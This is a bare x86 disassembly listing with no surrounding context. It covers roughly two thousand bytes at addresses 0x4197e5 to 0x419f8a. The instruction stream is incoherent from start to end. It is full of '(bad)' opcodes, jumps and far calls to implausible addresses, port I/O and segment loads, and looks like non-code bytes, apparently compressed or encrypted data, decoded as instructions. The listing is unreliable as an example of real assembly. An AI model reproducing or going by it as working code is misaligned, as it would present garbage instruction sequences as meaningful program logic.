  4197e5:	pop    ebp
  4197e6:	xlat   BYTE PTR ds:[ebx]
  4197e7:	ficom  WORD PTR [ebp+0x60]
  4197ea:	ds cwde 
  4197ec:	je     0x4197f5
  4197ee:	bound  esi,QWORD PTR [edi-0x7c200870]
  4197f4:	nop
  4197f5:	mov    ecx,0x5da740f2
  4197fa:	sbb    ecx,ebp
  4197fc:	inc    ebp
  4197fd:	or     BYTE PTR [edx+0x30],ah
  419800:	inc    eax
  419801:	jmp    0x23c559b5
  419806:	jle    0x41984a
  419808:	mov    bl,0x89
  41980a:	ss push ss
  41980c:	lock push edx
  41980e:	xor    al,0x6b
  419810:	mov    WORD PTR [edi],cs
  419812:	int    0x3f
  419814:	jl     0x4197ef
  419816:	idiv   BYTE PTR [ebx+edi*2]
  419819:	outs   dx,DWORD PTR ds:[esi]
  41981a:	push   ss
  41981b:	(bad)  
  41981c:	repnz mov bl,dh
  41981f:	pop    ebp
  419820:	sbb    ecx,DWORD PTR [esi]
  419822:	lods   eax,DWORD PTR ds:[esi]
  419823:	inc    eax
  419824:	jl     0x4197ff
  419826:	(bad)  
  419827:	cmp    eax,0xba006f7d
  41982c:	pop    es
  41982d:	push   es
  41982e:	mov    ebx,edx
  419830:	mov    al,ds:0xe07e7c7d
  419835:	jge    0x4198a3
  419837:	xchg   BYTE PTR [eax],bh
  419839:	aad    0xc6
  41983b:	jmp    0x419839
  41983d:	loopne 0x41985a
  41983f:	(bad)  
  419841:	loopne 0x41985e
  419843:	fiadd  WORD PTR [edi-0x6f]
  419846:	or     dh,BYTE PTR [ebx+0x3e4473f0]
  41984c:	add    al,0xb0
  41984e:	push   esp
  41984f:	mov    bh,0x43
  419851:	das    
  419852:	jmp    0x54f188b3
  419857:	xchg   edi,eax
  419858:	push   ebx
  419859:	das    
  41985a:	and    DWORD PTR [edx],0x26
  41985d:	stos   DWORD PTR es:[edi],eax
  41985e:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  419860:	sbb    al,0xe4
  419862:	jae    0x4197f9
  419864:	mov    ebx,0xd97043eb
  419869:	test   eax,0xe031e303
  41986e:	mov    fs,WORD PTR [ecx]
  419870:	ficomp DWORD PTR [ebx+0x59ddd39]
  419876:	in     al,0x62
  419878:	popf   
  419879:	or     eax,0xf6d530e8
  41987e:	inc    ebx
  41987f:	mov    ebx,0xe2c041d4
  419884:	fsubr  st,st(1)
  419886:	jp     0x4198ae
  419888:	cmc    
  419889:	aad    0x7e
  41988b:	mov    ds:0x76c3a5,al
  419890:	push   ds
  419891:	cmc    
  419892:	cmc    
  419893:	jg     0x419840
  419895:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419896:	fistp  WORD PTR [ebp-0x4f667683]
  41989c:	adc    BYTE PTR [edx],ch
  41989e:	adc    al,0x1d
  4198a0:	mov    BYTE PTR fs:[ecx+0x142a10b0],bl
  4198a7:	test   DWORD PTR [edx-0x28],ebx
  4198aa:	pop    ebp
  4198ab:	imul   dl
  4198ad:	pushf  
  4198ae:	add    eax,0x669945d8
  4198b3:	add    ah,BYTE PTR [edx-0x1a]
  4198b6:	test   eax,0x1e8c9fa8
  4198bb:	inc    esi
  4198bc:	push   esi
  4198bd:	fldenv [ebp+0x2c]
  4198c0:	mov    dh,0xdb
  4198c2:	pop    esi
  4198c3:	mov    edi,0x35f6cd81
  4198c8:	pop    ss
  4198c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4198ca:	int    0xe3
  4198cc:	jmp    0xcd9c:0xdaff8f20
  4198d3:	out    0xda,eax
  4198d5:	xchg   esp,eax
  4198d6:	(bad)
  4198d9:	loopne 0x419949
  4198db:	mov    edi,0x308efd41
  4198e0:	xchg   ecx,eax
  4198e1:	pop    esi
  4198e2:	add    DWORD PTR [ebp+0x1a193cde],eax
  4198e8:	jle    0x41986d
  4198ea:	in     eax,0x66
  4198ec:	push   0x5e
  4198ee:	push   esi
  4198ef:	push   ecx
  4198f0:	out    dx,eax
  4198f1:	repz pop ecx
  4198f3:	sbb    eax,DWORD PTR [eax]
  4198f5:	ja     0x419938
  4198f7:	gs add al,0x6b
  4198fa:	sub    al,0x8e
  4198fc:	lods   al,BYTE PTR ds:[esi]
  4198fd:	pop    ecx
  4198fe:	mov    ebx,edi
  419900:	aam    0x95
  419902:	mov    DWORD PTR [eax-0x17],0xdb751924
  419909:	push   ds
  41990a:	or     ecx,ebp
  41990c:	inc    edx
  41990d:	data16 sub al,0xfc
  419910:	fimul  DWORD PTR [eax-0x24]
  419913:	mov    dl,0x32
  419915:	mov    al,ds:0xbcdec155
  41991a:	add    ch,BYTE PTR [edi]
  41991c:	sub    DWORD PTR [edi+0x21e25818],esp
  419922:	and    al,0xd9
  419924:	and    BYTE PTR [esi],bl
  419926:	add    DWORD PTR [edi+0xca7e0f8],0xffffffe9
  41992d:	in     eax,0xc4
  41992f:	push   ebx
  419930:	sbb    ah,BYTE PTR [ebp-0x10]
  419933:	jp     0x419916
  419935:	xlat   BYTE PTR ds:[ebx]
  419936:	leave  
  419937:	xchg   DWORD PTR [edi],esp
  419939:	bound  edx,QWORD PTR [edx+0x13]
  41993c:	(bad)  
  41993d:	adc    dh,BYTE PTR [ecx-0x78]
  419940:	scas   eax,DWORD PTR es:[edi]
  419941:	mov    ecx,DWORD PTR gs:[esi+ebp*1]
  419945:	sbb    DWORD PTR [edi-0x7984c4f8],esp
  41994b:	xchg   DWORD PTR [edi],esi
  41994d:	bound  esi,QWORD PTR [ecx]
  41994f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419950:	imul   esp,DWORD PTR [edi-0x27],0x7f
  419954:	punpckldq mm3,mm1
  419957:	jg     0x419960
  419959:	add    dh,bh
  41995b:	sub    BYTE PTR [esi+0x0],bl
  41995e:	enter  0x8977,0xf1
  419962:	push   esp
  419963:	pop    ebp
  419964:	jnp    0x419972
  419966:	sti    
  419967:	mov    ds:0x58bf247c,eax
  41996c:	or     DWORD PTR [ebx+0x16892905],ecx
  419972:	sub    al,0x9
  419974:	mov    ah,0xff
  419976:	or     DWORD PTR [ecx],esi
  419978:	push   ebp
  419979:	mov    ebx,DWORD PTR [ebp-0x3b]
  41997c:	not    bh
  41997e:	sbb    al,0xe0
  419980:	pop    ebp
  419981:	pop    esi
  419982:	jns    0x41995d
  419984:	add    BYTE PTR [esi-0x3c],dl
  419987:	mov    ds:0xa3bf247c,eax
  41998c:	jmp    0x4199c9
  41998e:	mov    ebp,0xfb257124
  419993:	pop    esi
  419994:	or     BYTE PTR [eax],al
  419996:	out    0x37,eax
  419998:	push   ecx
  419999:	mov    ecx,DWORD PTR [esp+eiz*4+0x42]
  41999d:	add    al,0xf0
  41999f:	ss std 
  4199a1:	xor    al,0x3
  4199a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4199a4:	retf   0xc9ff
  4199a7:	xor    BYTE PTR [ecx+0x3b],al
  4199aa:	in     eax,dx
  4199ab:	and    esi,DWORD PTR [edx-0x13]
  4199ae:	mov    al,ds:0x33ce8978
  4199b3:	fcmovu st,st(0)
  4199b5:	jmp    FWORD PTR [edi+edi*2]
  4199b8:	pop    esi
  4199b9:	ret    0xdc47
  4199bc:	dec    edi
  4199bd:	mov    eax,DWORD PTR [eax]
  4199bf:	minps  xmm5,xmm5
  4199c2:	sbb    al,0x47
  4199c4:	fadd   QWORD PTR [eax]
  4199c6:	push   ebx
  4199c7:	rcl    DWORD PTR [ecx+0x8],0x56
  4199cb:	je     0x419971
  4199cd:	test   BYTE PTR [ebx+0x56d909fa],0xec
  4199d4:	sub    al,bl
  4199d6:	adc    ah,BYTE PTR [edx-0xe]
  4199d9:	add    al,0x81
  4199db:	cli    
  4199dc:	push   esi
  4199dd:	mov    WORD PTR [ecx-0x17],?
  4199e0:	outs   dx,DWORD PTR ds:[esi]
  4199e1:	pop    eax
  4199e2:	adc    BYTE PTR [esi+0x3f],dh
  4199e5:	sbb    BYTE PTR [esi-0x3b],ah
  4199e8:	scas   al,BYTE PTR es:[edi]
  4199e9:	add    ch,cl
  4199eb:	addr16 pop edx
  4199ed:	dec    edx
  4199ee:	retf   0x3263
  4199f1:	jl     0x4199b3
  4199f3:	push   edi
  4199f4:	push   ds
  4199f5:	scas   al,BYTE PTR es:[edi]
  4199f6:	mov    ecx,0x315e
  4199fb:	out    dx,eax
  4199fc:	test   BYTE PTR [edi],cl
  4199fe:	sti    
  4199ff:	mov    ch,0x9e
  419a01:	pop    ss
  419a02:	add    DWORD PTR [edi],esi
  419a04:	xor    al,BYTE PTR [eax]
  419a06:	mov    ebx,edi
  419a08:	loope  0x419a12
  419a0a:	std    
  419a0b:	popf   
  419a0c:	inc    ecx
  419a0d:	add    edx,DWORD PTR [ebx]
  419a0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a10:	and    al,al
  419a12:	(bad)  
  419a13:	fisubr WORD PTR [eax+ecx*1-0x49]
  419a17:	(bad)  
  419a18:	xor    DWORD PTR [eax],eax
  419a1a:	add    BYTE PTR [edx+0x75fcdc72],cl
  419a20:	lods   al,BYTE PTR ds:[esi]
  419a21:	sub    al,0x0
  419a24:	imul   esp,DWORD PTR [esi],0x31f85006
  419a2a:	jns    0x419a6f
  419a2c:	pop    edx
  419a2d:	inc    ecx
  419a2e:	jns    0x4199b3
  419a30:	push   edx
  419a31:	ds push es
  419a33:	std    
  419a34:	mov    dl,0x7
  419a36:	in     al,dx
  419a37:	push   edi
  419a38:	jo     0x419a2a
  419a3a:	add    al,0x83
  419a3c:	and    cl,BYTE PTR [ebp-0x529c9617]
  419a42:	jnp    0x419a2c
  419a44:	sub    DWORD PTR [eax+0x6],ebp
  419a47:	push   eax
  419a48:	mov    WORD PTR [edi-0x14],gs
  419a4b:	or     esi,DWORD PTR [ebx-0x10]
  419a4e:	add    al,0x8b
  419a50:	out    0xd9,eax
  419a52:	xchg   ecx,eax
  419a53:	or     DWORD PTR [edi],ecx
  419a55:	daa    
  419a56:	xchg   edx,eax
  419a57:	mov    dl,0x1b
  419a59:	fldl2t 
  419a5b:	add    al,0x71
  419a5d:	rcr    DWORD PTR [esi+0x2d],1
  419a60:	jmp    0x419a79
  419a62:	xchg   edx,eax
  419a63:	add    dh,cl
  419a65:	es jnp 0x4199e8
  419a68:	and    ch,BYTE PTR [ebp-0x5320802e]
  419a6e:	in     al,0x83
  419a70:	fcmovnbe st,st(3)
  419a72:	(bad)  
  419a74:	inc    ebp
  419a75:	leave  
  419a76:	add    al,BYTE PTR [edx+eiz*2]
  419a79:	es std 
  419a7b:	rep ins BYTE PTR es:[edi],dx
  419a7d:	cdq    
  419a7e:	jmp    0xb3723d88
  419a83:	add    al,0xaf
  419a85:	es clc 
  419a87:	inc    ebx
  419a88:	add    BYTE PTR [ebx+0x3f0379db],bh
  419a8e:	xchg   DWORD PTR [esi-0x162e5fc6],ecx
  419a94:	cmp    BYTE PTR [esi-0x37],0xb6
  419a98:	scas   al,BYTE PTR es:[edi]
  419a99:	das    
  419a9a:	mov    ds,WORD PTR [esi+0x1a]
  419a9d:	jmp    0x419abf
  419a9f:	mov    ecx,0x95a96978
  419aa4:	mov    edi,0xdf96556d
  419aa9:	dec    ebp
  419aaa:	push   eax
  419aab:	xchg   bh,bl
  419aad:	jno    0x419ae0
  419aaf:	leave  
  419ab0:	addr16 push edi
  419ab2:	outs   dx,BYTE PTR es:[esi]
  419ab4:	inc    ebx
  419ab5:	(bad)  
  419ab6:	stos   DWORD PTR es:[edi],eax
  419ab7:	pop    ss
  419ab8:	sub    ecx,esp
  419aba:	and    eax,0xad3ee45d
  419abf:	add    eax,0xd8ceae0
  419ac4:	in     al,dx
  419ac5:	lods   eax,DWORD PTR cs:[esi]
  419ac7:	add    eax,0x113dae8
  419acc:	shl    DWORD PTR [eax+0x27],0xfc
  419ad0:	scas   al,BYTE PTR es:[edi]
  419ad1:	mov    WORD PTR [ebp+0x18bfd24],ss
  419ad7:	jmp    0xfc66185d
  419adc:	cmp    BYTE PTR [ebx+0x9c56d50],0x51
  419ae3:	dec    ebp
  419ae4:	int    0xfd
  419ae6:	push   eax
  419ae7:	(bad)  
  419ae8:	xchg   ecx,eax
  419ae9:	lds    esp,FWORD PTR [esi+0x5400e901]
  419aef:	xchg   ebp,eax
  419af0:	and    al,0xd5
  419af2:	pop    edx
  419af3:	sub    ecx,ebp
  419af5:	in     eax,0x45
  419af7:	and    al,0xfc
  419af9:	fs push edi
  419afb:	lods   eax,DWORD PTR ds:[esi]
  419afc:	sub    al,0xc1
  419afe:	push   edi
  419aff:	es cld 
  419b01:	jmp    0x7317ec0c
  419b06:	ja     0x419b39
  419b08:	lods   al,BYTE PTR ds:[esi]
  419b09:	dec    edi
  419b0a:	popa   
  419b0b:	fld    DWORD PTR [ecx+ebp*1-0x4a043813]
  419b12:	mov    ch,0xf9
  419b14:	xchg   DWORD PTR [ebp+0x7255c9ad],esi
  419b1a:	aaa    
  419b1b:	xor    DWORD PTR [eax-0x78db99e9],esp
  419b21:	xor    edx,edi
  419b23:	push   ss
  419b24:	jmp    0xfc677c47
  419b29:	jae    0x419b4d
  419b2b:	test   BYTE PTR [edx-0x6c],bl
  419b2e:	or     bl,BYTE PTR [edx-0x3b]
  419b31:	fldenv [ebx+0x526a00dd]
  419b37:	in     eax,0x4f
  419b39:	xor    al,0xa8
  419b3b:	mov    gs,WORD PTR [eax+0x55]
  419b3e:	or     ebp,esp
  419b40:	add    BYTE PTR [eax-0x6e],ah
  419b43:	std    
  419b44:	and    BYTE PTR [eax],al
  419b46:	sub    al,bl
  419b48:	std    
  419b49:	adc    eax,0x40cc43
  419b4e:	adc    BYTE PTR [ecx+0x7e002424],0x1d
  419b55:	or     eax,0xde8d84
  419b5a:	add    BYTE PTR [ebx+0x55],dh
  419b5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b5e:	inc    eax
  419b5f:	or     ecx,DWORD PTR [ecx-0x30e4ea03]
  419b65:	inc    eax
  419b66:	add    BYTE PTR [ecx+edx*4-0x2705d3dc],bh
  419b6d:	add    BYTE PTR [eax],al
  419b6f:	inc    edx
  419b70:	pop    ecx
  419b71:	and    eax,0x25594230
  419b76:	xor    al,0x52
  419b78:	pop    ecx
  419b79:	and    eax,0xd1d3e38
  419b7e:	test   BYTE PTR [ecx-0x22],dl
  419b81:	add    BYTE PTR [eax],al
  419b83:	in     al,dx
  419b84:	dec    ecx
  419b85:	dec    eax
  419b86:	and    al,0xab
  419b88:	lea    eax,[edi+0x4bed5f4c]
  419b8e:	(bad)  
  419b8f:	jnp    0x419be3
  419b91:	mov    esp,0xfbf1fe0f
  419b96:	(bad)  
  419b97:	jnp    0x419c18
  419b99:	push   ebp
  419b9a:	push   edi
  419b9b:	repz js 0x419b3b
  419b9e:	inc    eax
  419b9f:	mov    edx,edi
  419ba1:	bswap  esp
  419ba3:	jnp    0x419b3d
  419ba5:	add    BYTE PTR [ebx+0xfd95243],cl
  419bab:	dec    edi
  419bad:	sti    
  419bae:	dec    DWORD PTR [ebx-0x75]
  419bb1:	std    
  419bb2:	adc    eax,0x40cd6b
  419bb7:	add    al,dl
  419bb9:	xor    BYTE PTR [edi-0x13],bh
  419bbc:	xor    al,0x5c
  419bbe:	in     eax,dx
  419bbf:	add    BYTE PTR [edx+0x32],ah
  419bc2:	add    BYTE PTR [eax-0x5e],ch
  419bc5:	mov    dl,0xff
  419bc7:	call   DWORD PTR [ebp-0x45fd953d]
  419bcd:	xor    bh,BYTE PTR [edi+0x0]
  419bd0:	(bad)  {k2}
  419bd5:	or     eax,0xf5db0040
  419bda:	sub    BYTE PTR [edi+ebx*8],dl
  419bdd:	jno    0x419c53
  419bdf:	and    edi,ebp
  419be1:	std    
  419be2:	sub    BYTE PTR [ebx+edx*4],bh
  419be5:	loop   0x419be6
  419be7:	adc    bl,BYTE PTR [edx-0x20ffbffa]
  419bed:	jno    0x419c63
  419bef:	or     eax,0x2c28f5ef
  419bf4:	xor    dh,BYTE PTR [ebx+0x72761018]
  419bfa:	add    BYTE PTR [ebx-0x78fbf35e],al
  419c00:	ds (bad) 
  419c02:	sbb    BYTE PTR [ecx+0x400fee6f],cl
  419c08:	bound  ecx,QWORD PTR [eax]
  419c0a:	or     BYTE PTR [ecx-0x5b],dl
  419c0d:	retf   
  419c0e:	mov    WORD PTR [ebx+0x46],es
  419c11:	add    ch,BYTE PTR [esi+0xa]
  419c14:	xor    ebx,esi
  419c16:	fld    DWORD PTR [esi+0x50181626]
  419c1c:	add    BYTE PTR [ebp+0x1114244d],al
  419c22:	retf   
  419c23:	sbb    ah,ah
  419c25:	push   edx
  419c26:	jb     0x419c28
  419c28:	mov    DWORD PTR [edx-0x4c],esi
  419c2b:	stc    
  419c2c:	jae    0x419c12
  419c2e:	dec    ebx
  419c2f:	pop    ecx
  419c30:	std    
  419c31:	ja     0x419bff
  419c33:	cmovo  esp,DWORD PTR [edx-0x47]
  419c37:	inc    ebx
  419c38:	and    al,0x82
  419c3a:	fldcw  WORD PTR [esp+eax*8-0x2f]
  419c3e:	mov    edx,0x15622451
  419c43:	sub    bl,BYTE PTR [ecx-0x71]
  419c46:	xchg   dl,cl
  419c48:	js     0x419bd0
  419c4a:	icebp  
  419c4b:	ret    0x7e78
  419c4e:	std    
  419c4f:	adc    bl,BYTE PTR [ecx-0x4f]
  419c52:	and    bl,ch
  419c54:	retf   
  419c55:	gs cdq 
  419c57:	jmp    0xe2ef69e2
  419c5c:	mov    WORD PTR [ecx+0x1386f5fd],?
  419c62:	scas   al,BYTE PTR es:[edi]
  419c63:	retf   
  419c64:	mov    WORD PTR [ecx-0x61d34203],gs
  419c6a:	std    
  419c6b:	sub    DWORD PTR [esi+0x62],ebp
  419c6e:	sub    edx,0x2e4eaa4b
  419c74:	sub    BYTE PTR [edx+0x262825ee],dl
  419c7a:	scas   eax,DWORD PTR es:[edi]
  419c7b:	jmp    0xb213cce0
  419c80:	enter  0x2d00,0x88
  419c84:	mov    esp,0xf5955100
  419c89:	inc    ebx
  419c8a:	bound  ecx,QWORD PTR [eax-0x68187be]
  419c90:	ins    BYTE PTR es:[edi],dx
  419c91:	push   eax
  419c92:	inc    esi
  419c93:	cmc    
  419c94:	fwait
  419c95:	jmp    0x419c6e
  419c97:	sub    cl,ch
  419c99:	add    ebx,ebx
  419c9b:	and    DWORD PTR [ebx],esp
  419c9d:	js     0x419cdd
  419c9f:	stc    
  419ca0:	mov    ah,0x0
  419ca2:	push   ecx
  419ca3:	add    eax,0x8b6243fa
  419ca8:	or     dl,BYTE PTR [edi]
  419caa:	mov    cl,cl
  419cac:	test   eax,0xd5221103
  419cb1:	shr    DWORD PTR [ebp-0x67],cl
  419cb4:	add    cl,ch
  419cb6:	scas   al,BYTE PTR es:[edi]
  419cb7:	and    al,0x16
  419cb9:	sbb    DWORD PTR [esi-0x67],esi
  419cbc:	add    BYTE PTR [edx-0x63],dh
  419cbf:	std    
  419cc0:	and    al,0xd2
  419cc2:	push   ecx
  419cc3:	and    al,0x75
  419cc5:	or     eax,0x4116248a
  419cca:	push   esp
  419ccb:	cdq    
  419ccc:	add    BYTE PTR [edx+0x1a],dh
  419ccf:	pop    ebx
  419cd0:	inc    ebp
  419cd1:	add    eax,0x3dc1564a
  419cd6:	ds mov cl,0x98
  419cd9:	xchg   BYTE PTR [ecx+0x6ca650d9],ah
  419cdf:	jmp    0x56a7c5f2
  419ce4:	rcr    DWORD PTR ds:0x75246800,0xc5
  419ceb:	cmp    DWORD PTR [ecx+edx*8],esp
  419cee:	xchg   BYTE PTR [ebp-0x3],ch
  419cf1:	and    al,0x7e
  419cf3:	je     0x419ca6
  419cf5:	push   cs
  419cf6:	sub    DWORD PTR [esi+0x50],ebx
  419cf9:	les    ecx,FWORD PTR [esi]
  419cfb:	inc    eax
  419cfc:	jle    0x419d55
  419cfe:	push   0xffffff9d
  419d00:	loope  0x419cc0
  419d02:	in     eax,0x61
  419d04:	xchg   BYTE PTR [edi-0x7874f1bb],al
  419d0a:	adc    al,0x6
  419d0c:	mov    ebx,0x45b9e944
  419d11:	and    al,0x3e
  419d13:	bound  esp,QWORD PTR [esi+esi*2]
  419d16:	(bad)  
  419d18:	or     esp,edi
  419d1a:	mov    ah,0x5d
  419d1c:	and    al,0x76
  419d1e:	icebp  
  419d1f:	bound  ecx,QWORD PTR [ebx]
  419d21:	and    BYTE PTR ds:0x6df1506d,0x96
  419d28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d29:	and    al,0x64
  419d2b:	imul   esp,DWORD PTR [ebx-0x72acffe9],0x4b
  419d32:	add    DWORD PTR [ebx+0x58],ecx
  419d35:	mov    esp,0xfd833974
  419d3a:	jne    0x419d6b
  419d3c:	dec    esi
  419d3d:	les    ebp,FWORD PTR [edx+0x3a]
  419d40:	and    BYTE PTR [edi+0x8],ch
  419d43:	xchg   ecx,eax
  419d44:	(bad)  
  419d45:	call   0x1181ba5
  419d4a:	call   0xfe3a824f
  419d4f:	push   DWORD PTR [eax+0x7e5b5e17]
  419d55:	sbb    al,0x4f
  419d57:	mov    ebx,DWORD PTR [edi]
  419d59:	lea    edx,[edx-0x75]
  419d5c:	push   ss
  419d5d:	jne    0x419dc2
  419d5f:	inc    esp
  419d60:	sti    
  419d61:	xor    al,0x40
  419d63:	daa    
  419d64:	fsub   QWORD PTR [eax]
  419d66:	std    
  419d67:	jne    0x419d64
  419d69:	push   edx
  419d6a:	aam    0xff
  419d6c:	push   esi
  419d6d:	leave  
  419d6e:	std    
  419d6f:	jne    0x419d64
  419d71:	pop    ds
  419d72:	(bad)  
  419d73:	add    DWORD PTR [edi],0xffffffca
  419d76:	mov    eax,esi
  419d78:	inc    edi
  419d79:	add    al,0x70
  419d7b:	and    al,0x46
  419d7d:	daa    
  419d7e:	je     0x419d9b
  419d80:	xor    ebx,esp
  419d82:	dec    ebx
  419d83:	add    ebx,ecx
  419d85:	push   ecx
  419d86:	mov    esp,0xfd86b974
  419d8b:	jne    0x419d1c
  419d8d:	push   ebx
  419d8e:	les    ebp,FWORD PTR [edx-0x46]
  419d91:	pop    ds
  419d92:	outs   dx,DWORD PTR ds:[esi]
  419d93:	or     BYTE PTR [ecx-0x41f41724],dh
  419d99:	aad    0x0
  419d9b:	call   0x3f9595
  419da0:	adc    BYTE PTR [edi],dl
  419da2:	pop    esi
  419da3:	pop    ebx
  419da4:	mov    esi,0x6201ac1b
  419da9:	hlt    
  419daa:	or     BYTE PTR [eax],al
  419dac:	je     0x419e24
  419dae:	and    al,0x4
  419db0:	add    BYTE PTR [ebx+0x40],ah
  419db3:	xchg   esi,ebp
  419db5:	and    eax,0xa29cb038
  419dba:	xor    dh,BYTE PTR [ebx+eax*1+0x3a]
  419dbe:	jnp    0x419e3e
  419dc0:	inc    DWORD PTR [ebp-0x55]
  419dc3:	lds    ebx,FWORD PTR [ebp+0x20]
  419dc6:	add    BYTE PTR ss:[ebx-0x17],dl
  419dca:	adc    eax,0x3402eb85
  419dcf:	add    BYTE PTR [eax],al
  419dd1:	xchg   ecx,eax
  419dd2:	rcl    BYTE PTR [ebx-0x77],0x1b
  419dd6:	and    edx,edi
  419dd8:	or     al,0xcd
  419dda:	test   BYTE PTR [eax],0x66
  419ddd:	out    0x78,eax
  419ddf:	jns    0x419de6
  419de1:	retf   
  419de2:	ins    DWORD PTR es:[edi],dx
  419de3:	add    BYTE PTR [eax],al
  419de5:	bound  ecx,QWORD PTR [ebx+0x3d]
  419de8:	xor    DWORD PTR [ebp+0x3a],0x7d3173fb
  419def:	cwde   
  419df0:	pop    edi
  419df1:	out    0x56,eax
  419df3:	sti    
  419df4:	out    0x96,eax
  419df6:	adc    bh,bl
  419df8:	cld    
  419df9:	aad    0x1e
  419dfb:	or     BYTE PTR [ebx-0x2fe2e19],cl
  419e01:	lds    esp,FWORD PTR [ecx+0x4f]
  419e04:	mov    esp,edi
  419e06:	dec    ecx
  419e07:	(bad)  
  419e08:	cld    
  419e09:	mov    ch,0x19
  419e0b:	push   ebp
  419e0c:	jmp    FWORD PTR [ebp-0x2617afcf]
  419e12:	pusha  
  419e13:	add    BYTE PTR [eax],al
  419e15:	add    cl,ah
  419e17:	cmc    
  419e18:	adc    eax,DWORD PTR [ebx-0x48efa25e]
  419e1e:	int3   
  419e1f:	xor    DWORD PTR [eax],eax
  419e21:	add    bh,dl
  419e23:	fdivr  DWORD PTR [ebx+ebp*4+0x7f]
  419e27:	pop    ds
  419e28:	sbb    ebp,ebx
  419e2a:	je     0x419deb
  419e2c:	adc    bh,dh
  419e2e:	test   DWORD PTR [ebx-0x60],edx
  419e31:	add    esp,DWORD PTR [edx+0x54]
  419e34:	xor    ch,bl
  419e36:	mov    esp,0xeb03ea63
  419e3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e3c:	in     eax,0x8c
  419e3e:	addr16 push esp
  419e40:	sub    bh,BYTE PTR [eax+0x5f]
  419e43:	jmp    0x419dee
  419e45:	jmp    0x419e4c
  419e47:	fucompp 
  419e49:	add    ebx,ebp
  419e4b:	xchg   esp,eax
  419e4c:	in     eax,0x30
  419e4e:	and    bh,BYTE PTR [eax+0x4c5e5d10]
  419e54:	xor    eax,0xaa446f10
  419e59:	mov    esp,DWORD PTR [eax+0x61cec21d]
  419e5f:	fldl2t 
  419e61:	xchg   ebp,eax
  419e63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e64:	sbb    al,0x6a
  419e66:	data16 mov cl,0xdd
  419e69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e6a:	xor    eax,0x5f8938d9
  419e6f:	mov    cl,0xa0
  419e71:	add    al,0x62
  419e73:	fst    DWORD PTR [ecx-0x1625ebd0]
  419e79:	xchg   DWORD PTR [eax],eax
  419e7b:	adc    eax,0x726a14a6
  419e80:	push   ds
  419e81:	repz (bad)
  419e84:	push   edx
  419e85:	hlt    
  419e86:	imul   ebp,DWORD PTR [edx-0x35fc1627],0xffffffc7
  419e8d:	fwait
  419e8e:	add    al,0x62
  419e90:	push   ebp
  419e91:	sub    bh,BYTE PTR [eax+0x1f]
  419e94:	mov    bl,0xed
  419e96:	mov    fs,WORD PTR [eax]
  419e98:	sbb    eax,0xcfeb529a
  419e9d:	add    cl,al
  419e9f:	fwait
  419ea0:	push   ds
  419ea1:	cld    
  419ea2:	jmp    0xe9f7bc20
  419ea7:	popa   
  419ea8:	push   ebp
  419ea9:	rcl    DWORD PTR [ebp+0x41865231],0x6c
  419eb0:	sbb    eax,0xcb66b9fc
  419eb5:	adc    dl,bl
  419eb7:	mov    eax,ds:0xdd6c50d9
  419ebc:	jne    0x419eb9
  419ebe:	test   BYTE PTR [esi-0x72],0x51
  419ec2:	bound  edx,QWORD PTR [ecx+esi*4-0x39]
  419ec6:	jmp    0xc12a782c
  419ecb:	in     al,dx
  419ecc:	sbb    eax,0xaa216dfc
  419ed1:	push   es
  419ed2:	bound  ebx,QWORD PTR [ecx+ecx*8+0x51a0b02f]
  419ed9:	or     edx,edx
  419edb:	outs   dx,DWORD PTR ds:[esi]
  419edc:	push   eax
  419edd:	xor    ebp,DWORD PTR [eax+eax*1+0x17]
  419ee1:	stos   BYTE PTR es:[edi],al
  419ee2:	or     ah,BYTE PTR [edx+0x57]
  419ee5:	xor    DWORD PTR [ecx],ebp
  419ee7:	and    al,0x61
  419ee9:	fld    DWORD PTR [edi+0x7dbf09af]
  419eef:	call   0x6409f255
  419ef4:	and    BYTE PTR [ebp+0x5a],bh
  419ef7:	and    ch,BYTE PTR [ecx+0x2fe90d17]
  419efd:	push   eax
  419efe:	repnz push ds
  419f00:	fistp  DWORD PTR [ebx+0x5d5fa604]
  419f06:	pushf  
  419f07:	test   eax,0xd5fc5a61
  419f0c:	addr16 push eax
  419f0e:	or     al,0x41
  419f10:	scas   eax,DWORD PTR es:[edi]
  419f11:	mov    eax,ds:0xcdae901
  419f16:	jmp    0xfbdffb1b
  419f1b:	dec    DWORD PTR [ebp-0x6a]
  419f1e:	and    al,0xc
  419f20:	jp     0x419f36
  419f22:	push   es
  419f23:	pusha  
  419f24:	adc    al,0x9a
  419f26:	add    BYTE PTR [esp+ecx*4+0x50],dh
  419f2a:	into   
  419f2b:	call   0x3d3d98
  419f30:	mov    ah,0x50
  419f32:	(bad)  
  419f33:	pop    esi
  419f34:	cmp    esi,edx
  419f36:	add    BYTE PTR [eax-0x7c7a863e],bh
  419f3c:	mov    BYTE PTR [ebx+0x34b8ec89],al
  419f42:	hlt    
  419f43:	add    DWORD PTR [eax],0x47
  419f46:	loopne 0x419f99
  419f48:	push   ebp
  419f49:	jge    0x419ed3
  419f4b:	mov    ecx,ebp
  419f4d:	pop    eax
  419f4e:	cld    
  419f4f:	xchg   BYTE PTR [edi+ebx*2-0x7],al
  419f53:	add    DWORD PTR [edi+ebx*2-0x67],0x31
  419f58:	rcl    BYTE PTR [edx-0x43efdb7f],0x99
  419f5f:	and    al,0x24
  419f61:	ret    
  419f62:	inc    eax
  419f63:	cmp    al,0x0
  419f65:	mov    esp,0x7f342499
  419f6a:	jns    0x419fa8
  419f6c:	add    BYTE PTR [ebp+0x4e],bl
  419f6f:	inc    eax
  419f70:	and    al,0xf3
  419f72:	dec    ebp
  419f73:	pop    eax
  419f74:	and    al,0xf7
  419f76:	dec    ebp
  419f77:	pop    eax
  419f78:	and    al,0xab
  419f7a:	and    ebx,0xffffff96
  419f7d:	retf   
  419f7e:	fadd   DWORD PTR [eax]
  419f80:	adc    ebp,0xffffffd4
  419f83:	adc    BYTE PTR [edi],cl
  419f85:	cmp    eax,0xcbfffc4c
  419f8a:	mov    cl,BYTE PTR [ecx-0x4d78ec31]
